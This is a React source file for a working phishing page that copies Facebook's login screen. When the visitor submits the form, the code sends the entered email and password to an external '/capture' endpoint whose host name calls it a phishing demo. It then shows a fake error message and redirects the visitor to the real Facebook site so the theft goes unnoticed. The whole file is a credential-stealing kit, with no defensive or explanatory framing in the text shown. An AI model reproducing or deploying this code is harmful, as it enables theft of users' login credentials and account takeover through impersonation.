import React, { useState } from "react";

export default function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch("https://phishing-demo-backend.onrender.com/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      if (res.ok) {
        const data = await res.json();
        console.log("Server Response:", data);
        alert('Something went wrong try again!');
        setEmail("");
        setPassword("");
        window.location.href = 'https://facebook.com';
      }
      //alert("Login request sent successfully!");
    } catch (error) {
      console.error("Error:", error);
      alert("Could not reach server.");
    }
  };

  return (
    <div className="flex items-center justify-center h-screen bg-[#f0f2f5]">
      <div className="flex flex-col md:flex-row items-center justify-center w-full max-w-5xl px-6">
        
        {/* Left side */}
        <div className="flex-1 mb-10 md:mb-0">
          <h1 className="text-[56px] font-bold text-blue-700">facebook</h1>
          <p className="text-[28px] leading-8">
            Connect with friends and the world <br />around you on Facebook.
          </p>
        </div>

        {/* Right side (Login form) */}
        <div className="flex flex-col bg-white p-6 rounded-xl shadow-md w-full max-w-sm">
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or phone number"
              className="w-full border border-gray-300 rounded-md p-3 mb-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              className="w-full border border-gray-300 rounded-md p-3 mb-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full bg-blue-700 text-white font-semibold py-3 rounded-md hover:bg-[#3700cc] transition"
            >
              Log In
            </button>
          </form>

          <a
            href="#"
            className="text-[#1877f2] text-center text-sm mt-3 hover:underline"
          >
            Forgot password?
          </a>

          <div className="border-t border-gray-300 my-4"></div>

          <button className="bg-[#42b72a] text-white py-3 rounded-md font-semibold hover:bg-[#36a420] transition">
            Create new account
          </button>
        </div>
      </div>
    </div>
  );
}
